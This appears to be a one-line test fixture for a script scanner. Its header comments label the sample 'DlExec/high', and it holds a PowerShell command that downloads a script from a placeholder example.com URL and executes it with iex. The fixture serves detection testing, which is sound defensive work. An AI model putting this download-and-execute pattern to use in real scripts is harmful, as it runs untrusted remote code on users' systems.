# expect: DlExec/high
# url: https://example.com/a.ps1
$s = irm https://example.com/a.ps1; iex $s
